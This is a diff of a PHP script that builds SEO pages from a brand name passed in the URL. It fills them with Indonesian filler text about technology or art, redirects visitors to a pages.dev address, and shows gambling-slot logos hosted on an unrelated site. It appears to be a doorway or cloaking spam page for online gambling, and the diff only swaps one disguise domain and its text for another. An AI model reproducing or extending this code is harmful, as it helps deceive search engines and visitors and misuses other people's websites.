@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x Albuonian.com – Informasi, Kreativitas, dan Wawasan Digital";
+    $title = "$BRAND x Dev.Aloaax.com: Pusat Informasi Teknologi dan Pengembangan Digital";
 
-    $description = "$BRAND x Temukan berbagai informasi dan wawasan menarik melalui Albuonian.com, mulai dari kreativitas, perkembangan digital, hingga berbagai topik yang relevan dengan kehidupan modern.";
+    $description = "$BRAND x Dev.Aloaax.com menghadirkan informasi seputar teknologi, software development, website development, pemrograman, inovasi digital, dan perkembangan dunia teknologi modern.";
     
-    $artikel = "$BRAND x Amani-Art.com hadir sebagai sebuah ruang yang dapat menjadi referensi bagi siapa saja yang memiliki ketertarikan terhadap dunia seni dan kreativitas. Seni tidak hanya berkaitan dengan hasil karya yang indah secara visual, tetapi juga menjadi media untuk menyampaikan gagasan, perasaan, identitas, dan perspektif seseorang terhadap lingkungan di sekitarnya.";
+    $artikel = "$BRAND x Dev.Aloaax.com merupakan platform digital yang dapat menjadi referensi bagi pengguna yang tertarik dengan teknologi, pemrograman, software development, serta perkembangan dunia digital. Kemajuan teknologi yang berlangsung semakin cepat membuat pengetahuan mengenai pengembangan aplikasi dan sistem digital menjadi semakin relevan.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/e6/90/25/e690258f53192c2ffa1aa54dc851a427.jpg";
+    $image = "https://i.pinimg.com/1200x/48/bf/81/48bf8151670fd6939a4425840d77e78a.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://albuonian.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://dev-aloaax.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
